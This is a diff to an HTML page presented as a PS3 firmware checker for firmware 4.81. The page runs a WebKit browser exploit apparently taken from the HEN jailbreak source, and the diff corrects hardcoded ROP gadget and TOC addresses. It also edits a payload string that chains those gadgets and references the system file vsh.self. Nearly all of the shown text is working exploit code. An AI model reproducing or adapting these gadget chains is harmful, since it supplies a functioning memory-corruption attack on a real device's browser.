@@ -16,6 +16,7 @@
     <div class="box">
         <h1>PS3 Minimum Firmware Checker (4.81)</h1>
         <p>This tool uses the WebKit exploit (OFW 4.81).</p>
+        <p><strong>Addresses from HEN source (CEX 4.81).</strong></p>
         <button id="WebKit_startBtn">Start Exploit</button>
         <div id="WebKit_result" class="result"></div>
     </div>
@@ -27,32 +28,32 @@
     <script>
         // ============================================================
         // WebKit exploit – stripped to read min firmware only
-        // Addresses hardcoded for 4.81 (from HEN source)
+        // Addresses for 4.81 CEX from HEN source
         // ============================================================
 
         function WebKit_showResult(str) {
             document.getElementById('WebKit_result').innerHTML = str;
         }
 
-        // ---- 4.81 addresses (from HEN) ----
+        // ---- 4.81 CEX addresses (from HEN) ----
         var WebKit_gtemp_addr = 0x8D000000;
         var WebKit_sp_exit = 0x8FD8DCC0;
         var WebKit_dbyte41 = 0x4141;
         var WebKit_dbyte00 = 0;
         var WebKit_mbytes = 0x100000;
 
-        // 4.81 specific
+        // CEX 4.81 specific (from HEN)
         var WebKit_toc_addr = 0x6F5520;
         var WebKit_gadget1_addr = 0x097604;
-        var WebKit_gadget_mod1_addr = 0x60EF9C;
+        var WebKit_gadget_mod1_addr = 0x60E59C;
         var WebKit_gadget_mod2_addr = 0x013B74;
         var WebKit_gadget_mod4a_addr = 0x0D9684;
-        var WebKit_gadget_mod4b_addr = 0x42C7D4;
+        var WebKit_gadget_mod4b_addr = 0x42C774;
         var WebKit_gadget_mod4c_addr = 0x054AF0;
         var WebKit_gadget_mod8_addr = 0x2BACB4;
-        var WebKit_gadget3_addr = 0x0D9684;
-        var WebKit_gadget7_addr = 0x1A6AC;
-        var WebKit_gadget8_addr = 0x20000; // for callsub
+        var WebKit_gadget3_addr = 0x0D505C;   // CORRECT – used in xtra_data
+        var WebKit_gadget7_addr = 0x01A6AC;   // mod7
+        var WebKit_gadget8_addr = 0x020000;   // memcpy
 
         // ---- Helper functions (same as before) ----
         function WebKit_hex16(s) { return ('0000' + s).slice(-4); }
@@ -303,10 +304,10 @@
                     unescape("\u0000\u0000\u0000\u0000\u0000\u0000") +
                     "rb".WebKit_convert() +
                     unescape("\u0000\u4141\u4141\u4141\u4141") +
-                    WebKit_hexw2bin(WebKit_gadget3_addr) +
+                    WebKit_hexw2bin(WebKit_gadget3_addr) +   // CORRECT: 0x0D505C
                     WebKit_hexw2bin(WebKit_toc_addr) +
                     unescape("\u0000\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141") +
-                    WebKit_hexw2bin(WebKit_gadget7_addr) +
+                    WebKit_hexw2bin(WebKit_gadget7_addr) +   // 0x01A6AC
                     WebKit_hexw2bin(WebKit_toc_addr) +
                     unescape("\u0000\u0000") +
                     "/dev_flash/vsh/module/vsh.self".WebKit_convert() +
